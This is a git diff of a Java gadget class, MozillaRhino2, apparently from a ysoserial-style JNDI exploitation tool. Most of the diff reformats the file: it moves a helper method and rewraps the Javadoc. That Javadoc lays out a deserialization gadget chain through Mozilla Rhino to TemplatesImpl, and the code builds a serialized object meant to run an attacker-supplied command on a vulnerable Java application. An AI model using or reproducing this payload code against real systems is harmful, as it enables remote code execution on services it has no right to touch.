@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
@@ -15,40 +14,45 @@ import java.util.Hashtable;
 import java.util.Map;
 
 
-
 /**
- *     Works on rhino 1.6R6 and above & doesn't depend on BadAttributeValueExpException's readObject
- *
- *     Chain:
- *
- *     NativeJavaObject.readObject()
- *       JavaAdapter.readAdapterObject()
- *         ObjectInputStream.readObject()
- *           ...
- *             NativeJavaObject.readObject()
- *               JavaAdapter.readAdapterObject()
- *                 JavaAdapter.getAdapterClass()
- *                   JavaAdapter.getObjectFunctionNames()
- *                     ScriptableObject.getProperty()
- *                         ScriptableObject.get()
- *                           ScriptableObject.getImpl()
- *                             Method.invoke()
- *                               Context.enter()
- *         JavaAdapter.getAdapterClass()
- *           JavaAdapter.getObjectFunctionNames()
- *             ScriptableObject.getProperty()
- *               NativeJavaArray.get()
- *                 NativeJavaObject.get()
- *                   JavaMembers.get()
- *                     Method.invoke()
- *                       TemplatesImpl.getOutputProperties()
- *                         ...
- *
- *     by @_tint0
+ * Works on rhino 1.6R6 and above & doesn't depend on BadAttributeValueExpException's readObject
+ * <p>
+ * Chain:
+ * <p>
+ * NativeJavaObject.readObject()
+ * JavaAdapter.readAdapterObject()
+ * ObjectInputStream.readObject()
+ * ...
+ * NativeJavaObject.readObject()
+ * JavaAdapter.readAdapterObject()
+ * JavaAdapter.getAdapterClass()
+ * JavaAdapter.getObjectFunctionNames()
+ * ScriptableObject.getProperty()
+ * ScriptableObject.get()
+ * ScriptableObject.getImpl()
+ * Method.invoke()
+ * Context.enter()
+ * JavaAdapter.getAdapterClass()
+ * JavaAdapter.getObjectFunctionNames()
+ * ScriptableObject.getProperty()
+ * NativeJavaArray.get()
+ * NativeJavaObject.get()
+ * JavaMembers.get()
+ * Method.invoke()
+ * TemplatesImpl.getOutputProperties()
+ * ...
+ * <p>
+ * by @_tint0
  */
 @Dependencies({"rhino:js:1.7R2"})
 @Authors({Authors.TINT0})
-public class MozillaRhino2 implements ObjectPayload<Object>{
+public class MozillaRhino2 implements ObjectPayload<Object> {
+    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
+        out.writeObject("java.lang.Object");
+        out.writeObject(new String[0]);
+        out.writeObject(javaObject);
+    }
+
     @Override
     public Object getObject(String command) throws Exception {
         ScriptableObject    dummyScope       = new Environment();
@@ -96,11 +100,5 @@ public class MozillaRhino2 implements ObjectPayload<Object>{
                 this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
         Reflections.setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);
         return nativeJavaObject;
-    }
-
-    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
-        out.writeObject("java.lang.Object");
-        out.writeObject(new String[0]);
-        out.writeObject(javaObject);
     }
 }
